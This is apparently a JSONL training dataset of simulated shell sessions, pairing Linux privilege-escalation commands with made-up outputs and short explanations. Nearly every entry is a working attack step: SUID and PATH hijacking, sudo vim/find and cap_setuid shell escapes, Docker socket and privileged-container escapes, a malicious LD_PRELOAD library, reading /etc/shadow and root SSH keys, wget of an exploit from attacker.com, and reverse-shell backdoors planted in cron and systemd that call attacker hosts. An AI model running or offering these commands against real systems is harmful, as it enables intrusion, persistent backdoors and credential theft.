{"input": "find / -perm -4000 -type f 2>/dev/null", "output": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/local/bin/backup\n/bin/mount\n/bin/umount\n/bin/ping", "explanation": "Find all SUID binaries on the system"}
{"input": "ls -la /usr/local/bin/backup && strings /usr/local/bin/backup", "output": "-rwsr-xr-x 1 root root 16384 Jan 15 10:30 /usr/local/bin/backup\n/lib64/ld-linux-x86-64.so.2\nsystem\ntar -czf /tmp/backup.tar.gz\n/bin/sh", "explanation": "Analyze SUID binary for relative path vulnerabilities"}
{"input": "echo '/bin/bash' > /tmp/tar && chmod +x /tmp/tar && PATH=/tmp:$PATH /usr/local/bin/backup", "output": "root@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@victim:~# whoami\nroot", "explanation": "Exploit SUID binary PATH hijacking to get root shell"}
{"input": "sudo -l", "output": "User user may run the following commands:\n    (root) NOPASSWD: /usr/bin/vim\n    (root) NOPASSWD: /usr/bin/find\n    (root) NOPASSWD: /bin/systemctl", "explanation": "Check sudo permissions for current user"}
{"input": "sudo vim -c ':!sh'", "output": "# id\nuid=0(root) gid=0(root) groups=0(root)\n# whoami\nroot\n# cat /etc/shadow\nroot:$6$xyz123...:18965:0:99999:7:::", "explanation": "Exploit sudo vim to spawn root shell"}
{"input": "sudo find /dev/null -exec /bin/sh \\;", "output": "# id\nuid=0(root) gid=0(root) groups=0(root)\n# ls /root\nroot.txt  .bash_history  .ssh", "explanation": "Use sudo find with -exec to get root shell"}
{"input": "uname -a", "output": "Linux victim 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux", "explanation": "Check kernel version for known exploits"}
{"input": "cat /etc/issue && cat /etc/*-release", "output": "Ubuntu 16.04.4 LTS\nDISTRIB_RELEASE=16.04\nVERSION=\"16.04.4 LTS (Xenial Xerus)\"", "explanation": "Identify OS version and codename"}
{"input": "searchsploit linux kernel 4.4 ubuntu privilege", "output": "Linux Kernel 4.4.0-116 - Local Privilege Escalation (CVE-2017-16995)\nLinux Kernel < 4.4.0-116 - Local Privilege Escalation (CVE-2017-1000112)", "explanation": "Search for kernel exploits in exploit-db"}
{"input": "wget http://attacker.com/exploit.c && gcc exploit.c -o exploit && ./exploit", "output": "[+] Kernel is vulnerable!\n[+] Spawning root shell...\nroot@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)", "explanation": "Download, compile and run kernel exploit"}
{"input": "cat /etc/crontab && ls -la /etc/cron.*", "output": "*/5 * * * * root /usr/local/bin/cleanup.sh\n-rwxrwxrwx 1 root root 145 /usr/local/bin/cleanup.sh", "explanation": "Check for writable cron jobs running as root"}
{"input": "echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /usr/local/bin/cleanup.sh", "output": "Payload injected into cleanup.sh\nWaiting for cron execution...", "explanation": "Inject reverse shell into writable cron script"}
{"input": "echo $PATH && for dir in $(echo $PATH | tr ':' ' '); do ls -ld $dir; done", "output": "/usr/local/bin:/usr/bin:/bin:/opt/scripts\ndrwxrwxrwx 2 root root 4096 /opt/scripts", "explanation": "Find writable directories in PATH"}
{"input": "getcap -r / 2>/dev/null", "output": "/usr/bin/python3.6 = cap_setuid+ep\n/usr/bin/perl = cap_setuid+ep\n/usr/bin/tar = cap_dac_read_search+ep", "explanation": "Enumerate binaries with Linux capabilities"}
{"input": "python3.6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", "output": "# id\nuid=0(root) gid=1000(user) groups=1000(user)\n# whoami\nroot", "explanation": "Exploit cap_setuid on python to get root"}
{"input": "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'", "output": "root@victim:~# id\nuid=0(root) gid=1000(user) groups=1000(user)", "explanation": "Use perl cap_setuid to escalate to root"}
{"input": "tar -cvf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/sh", "output": "/etc/shadow\n$ cat /etc/shadow\nroot:$6$abc...:18965:0:99999:7:::", "explanation": "Use tar cap_dac_read_search to read shadow file"}
{"input": "cat /proc/1/cgroup | grep docker && ls -la /.dockerenv", "output": "12:perf_event:/docker/a1b2c3d4e5f6\n-rwxr-xr-x 1 root root 0 /.dockerenv\nConfirmed: Running inside Docker", "explanation": "Check if running inside Docker container"}
{"input": "capsh --print | grep Current", "output": "Current: = cap_sys_admin,cap_dac_override,cap_setuid+eip\nContainer has cap_sys_admin - privileged!", "explanation": "Check container capabilities"}
{"input": "fdisk -l 2>/dev/null", "output": "Disk /dev/sda: 50 GiB\nDisk /dev/sdb: 100 GiB\nCan see host block devices!", "explanation": "List host disks visible from container"}
{"input": "mkdir /tmp/host && mount /dev/sda1 /tmp/host && ls /tmp/host", "output": "bin  boot  etc  home  root  usr  var\nHost filesystem mounted successfully!", "explanation": "Mount host filesystem from privileged container"}
{"input": "chroot /tmp/host /bin/bash", "output": "root@host:/# hostname\nhost-server\nroot@host:/# cat /root/.ssh/id_rsa\n-----BEGIN RSA PRIVATE KEY-----", "explanation": "Chroot to host filesystem for complete escape"}
{"input": "ls -la /var/run/docker.sock", "output": "srw-rw---- 1 root docker 0 /var/run/docker.sock\nDocker socket accessible!", "explanation": "Check for Docker socket exposure"}
{"input": "docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs sh", "output": "# id\nuid=0(root) gid=0(root)\n# hostname\nhost-server\nEscaped via docker socket", "explanation": "Spawn privileged container via Docker socket"}
{"input": "cat > /tmp/shell.c << 'EOF'\nvoid _init() { setuid(0); system(\"/bin/bash\"); }\nEOF\ngcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles", "output": "Compiled malicious shared library for LD_PRELOAD", "explanation": "Create LD_PRELOAD library for privilege escalation"}
{"input": "sudo LD_PRELOAD=/tmp/shell.so find", "output": "root@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)\nLD_PRELOAD escalation successful", "explanation": "Execute sudo command with LD_PRELOAD library"}
{"input": "find / -writable -type f 2>/dev/null | grep -E 'cron|systemd|bash'", "output": "/etc/cron.d/backup\n/usr/local/bin/cleanup.sh\n/etc/systemd/system/webapp.service", "explanation": "Find writable system files for persistence"}
{"input": "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\"' > /etc/cron.d/backdoor", "output": "Persistent backdoor created\nConnects every minute as root", "explanation": "Create persistent cron backdoor"}
{"input": "find / -perm -4000 -exec ls -la {} \\; 2>/dev/null | grep -E 'vim|find|python|perl'", "output": "-rwsr-xr-x 1 root root 234568 /usr/bin/vim.basic\n-rwsr-xr-x 1 root root 138456 /usr/bin/find", "explanation": "Find dangerous SUID binaries"}
{"input": "/usr/bin/find . -exec /bin/sh -p \\; -quit", "output": "# id\nuid=1000(user) gid=1000(user) euid=0(root)\n# cat /etc/shadow\nroot:$6$...:18965:0:99999:7:::", "explanation": "Exploit SUID find to get root shell"}
{"input": "cat /etc/passwd | grep -E 'sh$|bash$'", "output": "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000::/home/admin:/bin/bash\nuser:x:1001:1001::/home/user:/bin/sh", "explanation": "List users with shell access"}
{"input": "sudo systemctl edit apache2.service", "output": "[Service]\nExecStart=\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'\nBackdoor in systemd service", "explanation": "Modify systemd service for backdoor"}
{"input": "cat /proc/sys/kernel/osrelease && cat /proc/version", "output": "4.4.0-116-generic\nLinux version 4.4.0-116-generic (buildd@lgw01-amd64-001)", "explanation": "Get detailed kernel version information"}
{"input": "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty mypassword", "output": "Done! New user 'firefart' created with password 'mypassword'\nsu firefart\nfirefart@victim:~# id\nuid=0(root)", "explanation": "DirtyCow exploit creates root user"}
